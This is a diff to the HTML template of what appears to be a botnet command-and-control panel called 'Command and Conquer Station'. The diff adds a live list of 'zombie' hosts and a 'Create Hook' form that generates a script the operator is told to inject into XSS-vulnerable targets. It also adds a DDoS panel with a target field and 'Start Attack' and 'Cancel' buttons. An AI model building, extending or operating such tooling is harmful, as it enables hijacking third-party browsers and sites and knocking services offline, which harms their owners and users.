@@ -7,10 +7,12 @@
 
 
 <head>
-
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
 
 	<script type="text/javascript" src="{{ STATIC_URL }}js/ws4redis.js"></script>
 	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+	<script type="text/javascript" src="{{STATIC_URL}}/bootbox.min.js"></script>
+	<script type="text/javascript" src="{{STATIC_URL}}/bootstrap.min.js"></script>
 
 <script>
 
@@ -37,7 +39,7 @@
             }
 
             var csrftoken = getCookie('csrftoken');
-						console.log(csrftoken);
+
             function csrfSafeMethod(method) {
                 // these HTTP methods do not require CSRF protection
                 return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
@@ -65,9 +67,9 @@ $(function(){
 
 function msghandler(json){
 
-	if(json.hasOwnProperty('newZombie')){
+	if(json.hasOwnProperty('newZombieId')){
 
-		$('tr:first').append("<td>"+json['newZombie']);
+		$("table[name='zombies']").append("<tr class='active' id="+json['newzombieId']+">"+json['newzombieHost']+"</tr>");
 	}
 }
 
@@ -103,12 +105,14 @@ function createHook(){
 			data:{'server_ip':ipserver},
 			success: function(json){
 
-
-				alert(json['resp'])
+				var scpt = '"'+String(json['resp'])+'"';
+				bootbox.alert("Inject script with "+ scpt+ " to XSS vulnerable target.\n Script is located in current working directory.");
 			}
 	});
 }
+$(function(){$(".ddos").hide();})
 
+function drop(input){ $("."+input).toggle();}
 
 
 </script>
@@ -116,25 +120,87 @@ function createHook(){
 </head>
 
 <body>
+<div class="row">
+	<div class="col-md-12">
+			<div class="page-header">
+				<h1 style="text-align: center;"> <small>Command and Conquer Station</small></h1>
+			</div>
+		</div>
+	</div>
+<div class="row">
+	<div class="col-md-4">
 
-<tr>
-{%for zombie in zombies%}
-	<td>{{zombie.host}}</td>
-{%endfor%}
-</tr>
+		<div class="zombies">
+				<h1 style="text-align: center;"><small>Zombies</small></h1>
+			<table class ="table table-condensed">
+				{%for zombie in zombies%}
+				<tr id={{zombie.id}} class="active">{{zombie.host}}</tr>
+				{%endfor%}
+			</table>
+		</div>
+	</div>
 
-<div id="DDOS-control">
-<input id="target"/>
-<button onclick="ddos();" text="DDOS"/>
-<button onclick="cancel();",text="Cancel"/>
+	<div class="col-md-4 col-md-offset-15">
+
+		<div class="create-injection">
+			<div class="form-inline" >
+				<div class="form-group">
+					{% csrf_token %}
+
+					<input type="text" class="form-control" id="server_ip" placeholder="server ip">
+				</div>
+					<button onclick="createHook();" class="btn btn-default">Create Hook</button>
+				</div>
+		</div>
+
+		<div class="attacks" >
+
+		<table class="table table-bordered" >
+			<tbody>
+
+				<td>
+					<h1 style="text-align: center;"><small>Attacks</small></h1>
+				</td>
+			</tr>
+			<tr>
+				<td><button style="width: 100%;" onclick="drop('ddos');" class="btn btn-default"> DDOS</button></td>
+				</tr>
+
+		</tbody>
+		</table>
+
+		</div>
+
+	</div>
+
+	<div class="col-md-4 col-md-offset-20">
+		<h1 style="text-align:center;" > <small>Current Attack</small></h1>
+		<div class="ddos">
+		<div class="form-inline" >
+			<div class="form-group">
+				<label for="target">DDOS Target</label>
+				<input type="text" class="form-control" id="target" placeholder="ddos target">
+			</div>
+
+			<button onclick="ddos();" class="btn btn-default">Start Attack</button>
+			<button onclick="cancel();" class="btn btn-default">Cancel</button>
+		</div>
+		</div>
+
+
+
+
+	</div>
 </div>
 
-<div id="create-injection">
-		{% csrf_token %}
-	<input id="server_ip"/>
-	<button onclick="createHook();" text="Create Hook"/>
 
-</div>
+
+
+
+
+
+
+
 </body>
 
 </html>
